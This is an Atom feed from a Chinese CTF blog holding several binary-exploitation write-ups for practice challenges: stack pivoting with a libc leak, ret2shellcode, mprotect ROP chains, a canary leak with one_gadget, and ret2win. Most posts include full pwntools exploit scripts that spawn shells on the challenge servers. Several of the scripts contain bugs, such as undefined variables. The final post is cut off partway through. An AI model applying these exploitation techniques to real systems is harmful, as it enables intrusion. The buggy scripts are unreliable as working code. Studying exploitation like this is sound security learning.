<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://cc-nianchu.github.io</id>
    <title>nianchu</title>
    <updated>2021-09-22T13:50:36.093Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://cc-nianchu.github.io"/>
    <link rel="self" href="https://cc-nianchu.github.io/atom.xml"/>
    <subtitle>nianchu的blog</subtitle>
    <logo>https://cc-nianchu.github.io/images/avatar.png</logo>
    <icon>https://cc-nianchu.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, nianchu</rights>
    <entry>
        <title type="html"><![CDATA[泄漏libc+栈迁移]]></title>
        <id>https://cc-nianchu.github.io/post/xie-lou-libczhan-qian-yi/</id>
        <link href="https://cc-nianchu.github.io/post/xie-lou-libczhan-qian-yi/">
        </link>
        <updated>2021-09-21T10:42:04.000Z</updated>
        <content type="html"><![CDATA[<p>先得到附件     先checksec一下，发现是64位程序且有NX保护<br>
<img src="https://cc-nianchu.github.io/post-images/1632221270879.png" alt="" loading="lazy"><br>
然后我们运行一下这个文件<br>
<img src="https://cc-nianchu.github.io/post-images/1632221389732.png" alt="" loading="lazy"><br>
发现只有一次简单的输入而且给了一个地址，我们打开ida64看main函数。<br>
<img src="https://cc-nianchu.github.io/post-images/1632221481613.png" alt="" loading="lazy"><br>
发现main函数中 printf（buf)的基址已经有read函数，溢出了0x10.这意味着我们想构造rop链应该不行，因为长度不够，我们得另想办法，而且开了NX保护无法执行shellcode<br>
找sys函数且shift+F12无法找到sys函数已经/bin/sh函数<br>
于是我想到泄漏libc，然后我发现了puts函数，利用思路是栈溢出后利用puts函数打印出任何函数的地址，然后返回main函数再次进行利用<br>
利用 puts_plt 把 puts 函数的GOT表项打出来，然后回到main。<br>
这样子我们就可以泄漏出libc了<br>
libc_base=puts_addr -libc.symbols['put']<br>
以及我们想要的sys_addr=libc_base+libc.symbols['system']<br>
首先思路是这样的没错，但是我们很快就会发现0x10长度无法够我们泄漏libc，那我们得栈迁移，将栈迁移到buf前方。<br>
<img src="https://cc-nianchu.github.io/post-images/1632317862822.png" alt="" loading="lazy"></p>
<p>payload的构造：先填充8个字符，因为在64位系统的时候栈迁移会让rsp迁移到rbp+8的位置，这时候rsp会自动加8，所以我们要填充8个字节，pop_rdi会将pop放在rdi寄存器，然后利用put函数，参数放put_got，返回地址为main函数，然后填充&quot;a&quot;*(0xd0-len(payload)填充到p64(buf_addr)。最后的p64(leave)就是栈迁移的知识，leave相当于是mov rsp,rbp; pop rbp;，把rbp的值放到rsp，之后栈顶就是buf-8了，再pop rbp，就把buf-8给了rbp，所以执行完后<br>
如图：<img src="https://cc-nianchu.github.io/post-images/1632317941072.png" alt="" loading="lazy"><br>
然后就可以正常的执行我们构造的gadget片段了<br>
栈结构如图<br>
<img src="https://cc-nianchu.github.io/post-images/1632318017076.png" alt="" loading="lazy"><br>
泄露出了libc我们就可以利用system函数了，找到/bin/sh字符串地址<br>
puts_addr = u64(p.recv(6).ljust(8,'\x00'))<br>
libc_base = puts_addr - libc.symbols['puts']<br>
sys_addr = libc_base + libc.symbols['system']<br>
sh_addr = libc_base + next(libc.search('/bin/sh'))<br>
再次接收printf的地址<br>
leak_addr=int(p.recv(14),16)<br>
然后重新构造一个gadget片段执行system（/bin/sh)<br>
payload = 'a'<em>8+p64(pop_rdi)+p64(sh_addr)+p64(ret)+p64(sys_addr)<br>
payload += 'a'</em>(0xd0-len(payload))+p64(leak_addr)+p64(leave)</p>
<p>exp如下:</p>
<pre><code>from pwn import *
#from LibcSearcher import *

context.log_level = 'debug'
context.arch = 'amd64'

r = process(&quot;./1&quot;)
elf = ELF('./1')
libc= elf.libc
puts_got_addr = elf.got['puts']
puts_plt_addr = elf.plt['puts']
main = 0x00400577
pop_rdi = 0x00400663
leave = 0x0004005F8
address = int(p.recv(14),16)
addr = int(address,16)
print(addr)
#gdb.attach(r)

payload =  'a'*8
payload += p64(pop_rdi)
payload += p64(puts_got_addr)
payload += p64(puts_plt_addr)
payload += p64(main)
payload += b'A'*0xa8
payload += p64(addr)
payload += p64(leave)
#gdb.attach(r)
r.send(payload)
#gdb.attach(r)

puts_addr = u64(p.recv(6).ljust(8,'\x00'))
libc_base = puts_addr - libc.symbols['puts']
sys_addr = libc_base + libc.symbols['system']
sh_addr = libc_base + next(libc.search('/bin/sh'))

leak_addr=int(p.recv(14),16)

payload =  'a'*8
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)
payload += p64(main)
payload += b'A'*0xa8
payload += p64(leak_addr)
payload += p64(leave)

r.send(payload)


r.interactive()
</code></pre>
<p>第二题：<br>
拿到附件checksec</p>
<pre><code>[*] '/home/nianchu/Desktop/zhaoxinti/2'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<p>发现64位系统且开了nx保护，打开ida64，查看函数<br>
发现一个后门函数</p>
<pre><code>int success()
{
  puts(&amp;s);
  return system(&quot;/bin/sh&quot;);
}
</code></pre>
<p>会return 到system（&quot;/bin/sh&quot;)<br>
所以我们只需要找到溢出点然后返回到后门函数就行<br>
main函数：</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v5; // [rsp+Ch] [rbp-24h] BYREF
  int v6; // [rsp+10h] [rbp-20h]
  int v7; // [rsp+14h] [rbp-1Ch]
  char v8[8]; // [rsp+18h] [rbp-18h] BYREF
  void (*v9)(void); // [rsp+20h] [rbp-10h]
  unsigned __int64 v10; // [rsp+28h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  init();
  v7 = 0;
  v5 = 0;
  v6 = 1;
  puts(&amp;byte_400988);
  puts(a1);
  __isoc99_scanf((__int64)&amp;unk_400A87, (__int64)&amp;v5);
  while ( v6 )
  {
    if ( v5 == 1 )
    {
      puts(&amp;byte_400A90);
      system(&quot;poweroff&quot;);
      v6 = 0;
    }
    else if ( v5 == 2 )
    {
      puts(&amp;byte_400AC8);
      v6 = 0;
    }
    else
    {
      puts(&amp;byte_400B18);
      __isoc99_scanf((__int64)&amp;unk_400A87, (__int64)&amp;v5);
    }
  }
  puts(&amp;byte_400B40);
  puts(&amp;byte_400C08);
  fflush(stdin);
  puts(&amp;byte_400C4A);
  __isoc99_scanf((__int64)&amp;unk_400C5D, (__int64)v8);
  v9();
  return __readfsqword(0x28u) ^ v10;
}
</code></pre>
<p>main函数很长，但是我们发现第一次输入1就是关机，输入2会有一串字符串然后再会输入一次，并且发现v8【8】且下面有一个v9()并且v9是指针，点进去v8发现</p>
<pre><code>0000000000000024 var_24          dd ?
-0000000000000020 var_20          dd ?
-000000000000001C var_1C          dd ?
-0000000000000018 var_18          db 8 dup(?)
-0000000000000010 var_10          dq ?
-0000000000000008 var_8           dq ?
</code></pre>
<p>v8再 var_18但是v9在var_10，所以我们填充8个字符加返回地址变可以 cat flag了<br>
exp：</p>
<pre><code># -*- coding: UTF-8 –*-

from pwn import *
r=process('./2')
r.recvuntil('2.绑定系统开启重回巅峰之路')

r.sendline('2')
payload=p64(0xdeafbeef)+p64(0x400759)

r.recv()
r.sendline(payload)
r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[每日1+（认怂了）]]></title>
        <id>https://cc-nianchu.github.io/post/mei-ri-1ren-song-liao/</id>
        <link href="https://cc-nianchu.github.io/post/mei-ri-1ren-song-liao/">
        </link>
        <updated>2021-08-03T14:40:25.000Z</updated>
        <content type="html"><![CDATA[<h2 id="buu-ciscn_2019_n_5">buu ciscn_2019_n_5</h2>
<p>在buu上拿到附件 checksec一下</p>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
</code></pre>
<p>发现这是64位系统 没开任何保护<br>
打开ida64  找到main函数按F5获得伪代码</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  char text[30]; // [rsp+0h] [rbp-20h] BYREF

  setvbuf(stdout, 0LL, 2, 0LL);
  puts(&quot;tell me your name&quot;);
  read(0, name, 0x64uLL);
  puts(&quot;wow~ nice name!&quot;);
  puts(&quot;What do you want to say to me?&quot;);
  gets(text);
  return 0;
}
</code></pre>
<p>发现第一次让我们输入名字 然后限制长度为0x64  并且name是在.bss段上<br>
第二次是利用gets函数，没有限制长度，可以用gets函数进行溢出<br>
我们得思路是:<br>
第一个漏洞写入shellcode<br>
然后第二个漏洞溢出去到name参数去然后执行shellcode拿到shell<br>
exp:</p>
<pre><code>from pwn import*

q=remote('node4.buuoj.cn',25042)

q.sendlineafter('tell me your name',asm(shellcraft.sh()))

payload='a'*0x28+p64(0x601080)
q.sendlineafter('What do you want to say to me?',payload)

q.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[每日3+]]></title>
        <id>https://cc-nianchu.github.io/post/mei-ri-3/</id>
        <link href="https://cc-nianchu.github.io/post/mei-ri-3/">
        </link>
        <updated>2021-08-01T13:36:17.000Z</updated>
        <content type="html"><![CDATA[<h2 id="the-first-titleget_started_3dsctf_2016">the first title:get_started_3dsctf_2016</h2>
<p>拿到附件先checksec get_started_3dsctf_2016</p>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<p>发现这是32位系统开了NX保护打开ida32</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[56]; // [esp+4h] [ebp-38h] BYREF

  printf(&quot;Qual a palavrinha magica? &quot;, v4[0]);
  gets(v4);
  return 0;
}
void __cdecl get_flag(int a1, int a2)
{
  int v2; // esi
  unsigned __int8 v3; // al
  int v4; // ecx
  unsigned __int8 v5; // al

  if ( a1 == 814536271 &amp;&amp; a2 == 425138641 )
  {
    v2 = fopen(&quot;flag.txt&quot;, &quot;rt&quot;);
    v3 = getc(v2);
    if ( v3 != 255 )
    {
      v4 = (char)v3;
      do
      {
        putchar(v4);
        v5 = getc(v2);
        v4 = (char)v5;
      }
      while ( v5 != 255 );
    }
    fclose(v2);
  }
}
</code></pre>
<p>在这里看到main函数是可以进行溢出的，而且有get_flag的函数，就是通过main函数溢出到返回地址的时候直接溢出到if条件判断里面。<br>
原本以为就是单纯一个很简单的溢出+后门函数但是上了EXP之后一直无法拿到flag很觉得很奇怪然后上了百度。。<br>
<img src="https://cc-nianchu.github.io/post-images/1627825028037.jpg" alt="" loading="lazy"><br>
我一开始的exp:</p>
<pre><code>from pwn import*

#q = process('./get_started_3dsctf_2016')
q=remote(&quot;node4.buuoj.cn&quot;,25415)

payload = 'a'*56
payload += p32(0x080489B8)
q.sendline(payload)
q.interactive()
</code></pre>
<p>然后上了百度看到一个博主说打远程时候如果程序是异常退出的话最后是不给你回显的。所以我们得想办法让程序正常退出。<br>
有2种方法:<br>
第一种办法:<br>
不绕过if判断返回地址溢出变成带参数<br>
答案是可以的，大概就是这么布局：'a'*溢出量 + 'ebp' + get_flag + get_flag的返回地址 + 参数1 + 参数2<br>
exp:</p>
<pre><code>from pwn import *
q = remote('node4.buuoj.cn',25415)
#q = process('./get_started_3dsctf_2016')
payload = 'a'*56
payload += p32(0x080489A0) + p32(0x0804E6A0)
payload += p32(0x308CD64F) + p32(0x195719D1)
q.sendline(payload)
q.interactive()
</code></pre>
<p>这种是可以拿到flag的，但是我发现别的大佬都是给.bss赋值给权限然后再.bss访问。<br>
有这么一个函数，mprotect，我们先来学习一下。</p>
<p>int mprotect(const void *start, size_t len, int prot);</p>
<p>第一个参数填的是一个地址，是指需要进行操作的地址。</p>
<p>第二个参数是地址往后多大的长度。</p>
<p>第三个参数的是要赋予的权限。</p>
<p>mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</p>
<p>prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</p>
<p>1）PROT_READ：表示内存段内的内容可写；</p>
<p>2）PROT_WRITE：表示内存段内的内容可读；</p>
<p>3）PROT_EXEC：表示内存段中的内容可执行；</p>
<p>4）PROT_NONE：表示内存段中的内容根本没法访问。</p>
<p>prot=7 是可读可写可执行<br>
需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。<br>
EXP:如下</p>
<pre><code>from pwn import *
q = remote('node4.buuoj.cn',25415)
#q = process('./get_started_3dsctf_2016')
context.log_level = 'debug'

mprotect = 0x0806EC80
buf = 0x80ea000
pop_3_ret = 0x0804f460
read_addr = 0x0806E140

payload = 'a'*56
payload += p32(mprotect)
payload += p32(pop_3_ret)
payload += p32(buf)
payload += p32(0x1000)
payload += p32(0x7)
payload += p32(read_addr)
payload += p32(buf)
payload += p32(0)
payload += p32(buf)
payload += p32(0x100)
q.sendline(payload)

shellcode = asm(shellcraft.sh(),arch='i386',os='linux')
q.sendline(shellcode)

q.interactive()
</code></pre>
<p>一道题花费了3个多小时，发现自己是真的菜！！！</p>
<h2 id="the-second-titlenot_the_same_3dsctf_2016buu">the second title:not_the_same_3dsctf_2016(buu)</h2>
<p>在buu上拿到附件，然后打开ubuntu checksec 一下</p>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

</code></pre>
<p>发现开了NX保护，32位系统，打开ida32</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[45]; // [esp+Fh] [ebp-2Dh] BYREF

  printf(&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;);
  gets(v4);
  return 0;
}
int get_secret()
{
  int v0; // esi

  v0 = fopen(&quot;flag.txt&quot;, &amp;unk_80CF91B);
  fgets(&amp;fl4g, 45, v0);
  return fclose(v0);
}
</code></pre>
<p>发现gets()函数，可以进行溢出，然后覆盖返回地址去读出flag，然后利用get_secret函数的输入点造成溢出然后覆盖返回地址到write函数的地址，打印出unk_80CF91B里的flag的内容。。但是做不出来<br>
然后被迫看wp,发现fgets的用法的时候，发现它能够避免造成溢出，而且fl4g在bss段，没有ret指令可以继续控制程序。<br>
然后用mprotect函数，可以用它来修改我们内存栈的权限，让它可读可写可执行，接着让写入shellcode，然后执行获取shell，这题的做法跟get_started_3dsctf_2016这题类似<br>
由于需要利用ret指令控制程序，所以这里需要借助用来设置三个参数的三个寄存器命令，p3_ret=0x806fcc8</p>
<pre><code> ROPgadget --binary not_the_same_3dsctf_2016 --only &quot;pop|ret&quot;|grep pop
</code></pre>
<p>EXP:</p>
<pre><code>from pwn import*

r=remote('node4.buuoj.cn',25899)
elf=ELF('not_the_same_3dsctf_2016')
read_addr=elf.symbols['read']
mprotect=0x806ED40
addr=0x80eb000
p3_ret=0x806fcc8

shellcode=asm(shellcraft.sh())

payload  ='a'*0x2d+p32(mprotect)+p32(p3_ret)
payload +=p32(addr)+p32(0x100)+p32(0x7)

payload +=p32(read_addr)+p32(p3_ret)

payload +=p32(0)+p32(addr)+p32(len(shellcode))+p32(addr)

r.sendline(payload)
r.sendline(shellcode)

r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[每日3+道题，之前被迫出门7天正式回归]]></title>
        <id>https://cc-nianchu.github.io/post/mei-ri-3dao-ti-zhi-qian-bei-po-chu-men-7-tian-zheng-shi-hui-gui/</id>
        <link href="https://cc-nianchu.github.io/post/mei-ri-3dao-ti-zhi-qian-bei-po-chu-men-7-tian-zheng-shi-hui-gui/">
        </link>
        <updated>2021-07-31T12:58:28.000Z</updated>
        <content type="html"><![CDATA[<h2 id="the-first-titleciscn_2019_n_8">the first title:ciscn_2019_n_8</h2>
<p>好久没做题了 先刷刷buu<br>
上来给了附近  拿到附近先checksec</p>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre>
<p>发现这是 32位程序 并且开了各种各样的保护<br>
打开ida32拉入文件 F5一键伪代码</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp-14h] [ebp-20h]
  int v5; // [esp-10h] [ebp-1Ch]

  var[13] = 0;
  var[14] = 0;
  init();
  puts(&quot;What's your name?&quot;);
  __isoc99_scanf(&quot;%s&quot;, var, v4, v5);
  if ( *(_QWORD *)&amp;var[13] )
  {
    if ( *(_QWORD *)&amp;var[13] == 17LL )
      system(&quot;/bin/sh&quot;);
    else
      printf(
        &quot;something wrong! val is %d&quot;,
        var[0],
        var[1],
        var[2],
        var[3],
        var[4],
        var[5],
        var[6],
        var[7],
        var[8],
        var[9],
        var[10],
        var[11],
        var[12],
        var[13],
        var[14]);
  }
  else
  {
    printf(&quot;%s, Welcome!\n&quot;, var);
    puts(&quot;Try do something~&quot;);
  }
  return 0;
}
</code></pre>
<p>很明显  发现这条语句</p>
<pre><code>if ( *(_QWORD *)&amp;var[13] == 17LL )
      system(&quot;/bin/sh&quot;);
</code></pre>
<p>意思就是只需要(_QWORD *)&amp;v[13] ==17<br>
并且是QWORD 这是8字节的意思 这题就是图一乐，解题<br>
EXP如下:</p>
<pre><code>from pwn import*

#q=process('./ciscn_2019_n_8')
q = remote(&quot;node4.buuoj.cn&quot;,28263)

payload =='sbsb'*13+p32(0x11)+p32(0)
q.sendline(payload)
q.interactive()
</code></pre>
<p>这里奉上flag{b3b5aa9f-c456-487a-9907-b25cf6cd0fef}</p>
<h2 id="the-second-titlejarvisoj_tell_me_something">the second title:jarvisoj_tell_me_something</h2>
<p>给了附件<br>
直接用unbuntu ctrl+alt+T打开终端 checksec一下</p>
<pre><code>    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<p>发现只开了NX保护<br>
打开ida64 F5获得伪代码</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v4; // [rsp+0h] [rbp-88h] BYREF

  write(1, &quot;Input your message:\n&quot;, 0x14uLL);
  read(0, &amp;v4, 0x100uLL);
  return write(1, &quot;I have received your message, Thank you!\n&quot;, 0x29uLL);
}
</code></pre>
<p>很简洁的一道题，我们发现有write和read函数，可以看出read函数有栈溢出<br>
并且发现了一个good_name函数</p>
<pre><code>int good_game()
{
  FILE *v0; // rbx
  int result; // eax
  char buf[9]; // [rsp+Fh] [rbp-9h] BYREF

  v0 = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
  while ( 1 )
  {
    result = fgetc(v0);
    buf[0] = result;
    if ( (_BYTE)result == 0xFF )
      break;
    write(1, buf, 1uLL);
  }
  return result;
}
</code></pre>
<p>就是经典的栈溢出然后返回到后门函数的题目<br>
然后点开v4发现有0x88的位置<br>
EXP如下:</p>
<pre><code>from pwn import*

#q=process(./guestbook)
q=remote(&quot;node4.buuoj.cn&quot;,28416)

door_addr=0x400620
payload='a'*0x88+p64(door_addr)
q.sendline(payload)

q.interactive()
</code></pre>
<p>flag如下：flag{0931ff4c-afd4-4cb2-a673-1d55027682ce}</p>
<h2 id="the-third-titleciscn_2019_ne_5">the third title:ciscn_2019_ne_5</h2>
<p>buu上的题目  拿到附件先checksec</p>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

</code></pre>
<p>发现这是32位程序  打开ida32</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  int v4; // [esp+0h] [ebp-100h] BYREF
  char src[4]; // [esp+4h] [ebp-FCh] BYREF
  char v6[124]; // [esp+8h] [ebp-F8h] BYREF
  char s1[4]; // [esp+84h] [ebp-7Ch] BYREF
  char v8[96]; // [esp+88h] [ebp-78h] BYREF
  int *v9; // [esp+F4h] [ebp-Ch]

  v9 = &amp;argc;
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  fflush(stdout);
  *(_DWORD *)s1 = 48;
  memset(v8, 0, sizeof(v8));
  *(_DWORD *)src = 48;
  memset(v6, 0, sizeof(v6));
  puts(&quot;Welcome to use LFS.&quot;);
  printf(&quot;Please input admin password:&quot;);
  __isoc99_scanf(&quot;%100s&quot;, s1);
  if ( strcmp(s1, &quot;administrator&quot;) )
  {
    puts(&quot;Password Error!&quot;);
    exit(0);
  }
  puts(&quot;Welcome!&quot;);
  puts(&quot;Input your operation:&quot;);
  puts(&quot;1.Add a log.&quot;);
  puts(&quot;2.Display all logs.&quot;);
  puts(&quot;3.Print all logs.&quot;);
  printf(&quot;0.Exit\n:&quot;);
  __isoc99_scanf(&quot;%d&quot;, &amp;v4);
  switch ( v4 )
  {
    case 0:
      exit(0);
      return result;
    case 1:
      AddLog(src);
      result = sub_804892B(argc, argv, envp);
      break;
    case 2:
      Display(src);
      result = sub_804892B(argc, argv, envp);
      break;
    case 3:
      Print();
      result = sub_804892B(argc, argv, envp);
      break;
    case 4:
      GetFlag(src);
      result = sub_804892B(argc, argv, envp);
      break;
    default:
      result = sub_804892B(argc, argv, envp);
      break;
  }
  return result;
;
</code></pre>
<p>发现这里代码很长，我们主要关注重点和大概浏览一下这个程序是干嘛的</p>
<pre><code> *(_DWORD *)s1 = 48;
__isoc99_scanf(&quot;%100s&quot;, s1);
  if ( strcmp(s1, &quot;administrator&quot;) )
  {
    puts(&quot;Password Error!&quot;);
    exit(0);
  }
  and
  case 4:
      GetFlag(src);
      result = sub_804892B(argc, argv, envp);
      break;
</code></pre>
<p>看到这几个代码，我们可以发现s1只有48，但是scanf写入100了这边存在溢出漏洞，而且密码已经给出来了administrator。。。然后我们发现本身就有getflag这样的函数，我们点进去查看</p>
<pre><code>int __cdecl GetFlag(char *src)
{
  char dest[4]; // [esp+0h] [ebp-48h] BYREF
  char v3[60]; // [esp+4h] [ebp-44h] BYREF

  *(_DWORD *)dest = 48;
  memset(v3, 0, sizeof(v3));
  strcpy(dest, src);
  return printf(&quot;The flag is your log:%s\n&quot;, dest);
}
</code></pre>
<p>我们发现他给的flag就是 src直接复制给dest然后输出给我们，src这里我们怎么获得?<br>
获得就是要先输入1  添加一个log再选4调用getflag<br>
我们来查看addlog这个函数</p>
<pre><code>int __cdecl AddLog(int a1)
{
  printf(&quot;Please input new log info:&quot;);
  return __isoc99_scanf(&quot;%128s&quot;, a1);
}
</code></pre>
<p>然后我们发现这里又可以进行溢出，a1是main函数的src给的是48，这里是读入128长度的字符串，可以造成溢出然后将返回地址覆盖为/bin/sh然后将flag丢进去我们再用4调出来<br>
返回ida按下shift+F12可以查看有system函数<br>
system_addr=0x080484D0<br>
或者网上的方法:system_addr=elf.sym['system']<br>
然后我们就想办法得到/bin/sh  做题的时候找好久都没找出来...<br>
直至百度....<br>
ROPgadget --binary ciscn_2019_ne_5 --string '/bin/sh'<br>
ROPgadget --binary ciscn_2019_ne_5 --string 'sh'<br>
显示地址0x080482ea:sh<br>
这里可以得到第一个payload='0x48+4'+p32(system_addr)+'sbsb'+p32(sh_addr)<br>
EXP如下:</p>
<pre><code>from pwn import*

#q=process(./ciscn_2019_ne_5)
q=remote(&quot;node4.buuoj.cn&quot;,27088)

#q.recvuntil('Please input admin password:')
q.sendline('administrator')


#q.recvuntil('0.Exit\n:')
q.sendline('1')

system_addr=0x080484D0
sh_addr=0x080482ea

payload='a'*(0x48+4)+p32(system_addr)+'bbbb'+p32(sh_addr)
q.sendline(payload)
#q.recvuntil('0.Exit\n:')
q.sendline('4')

#q.sendline('cat flag')
q.interactive()
</code></pre>
<p>flag:flag{ab30483c-2f22-412a-bc6a-9430b24c8041}</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[One-gadget]]></title>
        <id>https://cc-nianchu.github.io/post/one-gadget/</id>
        <link href="https://cc-nianchu.github.io/post/one-gadget/">
        </link>
        <updated>2021-07-23T11:42:00.000Z</updated>
        <content type="html"><![CDATA[<p>one-gadget是libc中存在的一些执行execve('/bin/sh),NULL,NULL)的片段<br>
条件</p>
<ul>
<li>1.知道libc版本</li>
<li>2.通过信息泄漏得到libc基址<br>
结果：通过控制EIP/RIP（覆盖got.plt或者函数返回地址）执行gadget达到远程代码执行，获得shell</li>
</ul>
<h2 id="攻防世界进阶区pwn1-babystack">攻防世界进阶区pwn1 babystack</h2>
<p>给的附近有一个二进制文件和一个libc-2.23.so<br>
条件一已经满足只有libc版本</p>
<pre><code>Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<p>首先发现这是64位系统并且开了canary和NX保护<br>
<img src="https://cc-nianchu.github.io/post-images/1627042794369.png" alt="" loading="lazy"><br>
因为知道了libc版本，我们这里使用One-gadget</p>
<pre><code>one_gadget libc-2.23.so
0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0274 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL
</code></pre>
<p>这里可以得到execve_addr = 0x45216<br>
因为这里开了canary，我们首先得canary的值算出来<br>
可以看出v6储存的是canary，s是我们输入的字符串，二者相距0x88字节。<br>
则我们先输入0x88个字节，再利用print函数就可以把canary的值带出来</p>
<pre><code>payload1 = 'A'*0x88
r.sendlineafter(&quot;&gt;&gt; &quot;,&quot;1&quot;)
r.sendline(payload1)
r.sendlineafter(&quot;&gt;&gt; &quot;,&quot;2&quot;)
r.recvuntil('A'*0x88+'\n')
canary = u64(r.recv(7).rjust(8,'\x00'))
</code></pre>
<p>有了canary的值我们可以进行溢出，64位程序溢出还需要一个pop rdi;ret<br>
//我也不太懂，书里这样子写。。。<br>
可以输入ROPgadget --binary babystack --only &quot;pop|ret&quot;<br>
得到0x0000000000400a93 : pop rdi ; ret<br>
解题思路：<br>
我们用one_gadget libc文件名来查找one_gadget。<br>
①这道题主要是绕过canary，然后栈溢出getshell。<br>
②经分析，read函数读入到s处，可以溢出。<br>
③put函数输出s的内容，遇到’\x00’才停止，即使字符串中存在’\n’,也会继续输出，用来泄露canary的值。<br>
④泄露出canary的值后，通过read函数溢出，泄露出read函数地址，得到libc基址。<br>
⑤用onegadget直接找到execve的地址，再次溢出，跳转到此地址获得shell<br>
EXP:</p>
<pre><code>from pwn import *
from LibcSearcher import *
context(log_level='debug',arch='amd64',os='linux')
elf = ELF('./babystack')
libc = ELF('./libc-2.23.so')
r = remote(&quot;111.198.29.45&quot;,51596)
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
execve = 0x45216 #one_gadget得到
main_addr = 0x400908 #main函数地址
rdi_addr = 0x400a93 #pop rdi;ret

payload1 = 'A'*0x88 #s和canary距离
r.sendlineafter(&quot;&gt;&gt; &quot;,&quot;1&quot;)
r.sendline(payload1) #要使用sendline，即输入'A'*0x88后还要有一个回车，目的是将canary尾部的'\x00'覆盖为'\x0A'
#用puts函数输出canary时，puts函数遇到'\x00'会截断，使用'\x0A'覆盖'\x00'，才能将canary输出
#注意，本程序是小端字节序（低位地址对应高位字节）
r.sendlineafter(&quot;&gt;&gt; &quot;,&quot;2&quot;)
r.recvuntil('A'*0x88+'\n') #要等到'\n'之后再读取
canary = u64(r.recv(7).rjust(8,'\x00')) #r.recv(7)是由于puts输出的canary最后一位是'\x0A',要重新换成'\x00'

payload2 = 'A'*0x88
payload2+=p64(canary)+p64(0xdeadbeef)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)# 调用puts函数将puts函数的地址输出
r.sendlineafter(&quot;&gt;&gt; &quot;,&quot;1&quot;)
r.sendline(payload2)
r.sendlineafter(&quot;&gt;&gt; &quot;,&quot;3&quot;)
puts_addr = u64(r.recv(8).ljust(8,'\x00'))

offset = puts_addr - libc.symbols['puts']
execve_addr = offset + execve

payload3 = 'A'*0x88 + p64(canary) + p64(0xdeadbeef) + p64(execve_addr)

r.sendlineafter(&quot;&gt;&gt; &quot;,&quot;1&quot;)
r.sendline(payload3)
r.sendlineafter(&quot;&gt;&gt; &quot;,&quot;3&quot;)
r.interactive()

r.sendlineafter(&quot;&gt;&gt; &quot;,&quot;1&quot;)
r.sendline(payload3)
r.sendlineafter(&quot;&gt;&gt; &quot;,&quot;3&quot;)
r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[再战canary--尝试使用gdb]]></title>
        <id>https://cc-nianchu.github.io/post/zai-zhan-canary-chang-shi-shi-yong-gdb/</id>
        <link href="https://cc-nianchu.github.io/post/zai-zhan-canary-chang-shi-shi-yong-gdb/">
        </link>
        <updated>2021-07-21T09:41:58.000Z</updated>
        <content type="html"><![CDATA[<h2 id="题目为bugku-pwn4">题目为bugku pwn4</h2>
<p>先checksec一下看有什么保护和啥类型程序</p>
<pre><code>pwndbg&gt; checksec
[*] '/home/nianchu/Desktop/bugku/pwn4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<p>发现有Canary和NX保护，使用IDA64查看题目文件按F5反编译得伪代码</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[48]; // [rsp+10h] [rbp-240h] BYREF
  char v5[520]; // [rsp+40h] [rbp-210h] BYREF
  unsigned __int64 v6; // [rsp+248h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init();
  write(1, &quot;Welcome!\n&quot;, 0x10uLL);
  write(1, &quot;Please leave your name(Within 36 Length):&quot;, 0x29uLL);
  read(0, buf, 0x300uLL);
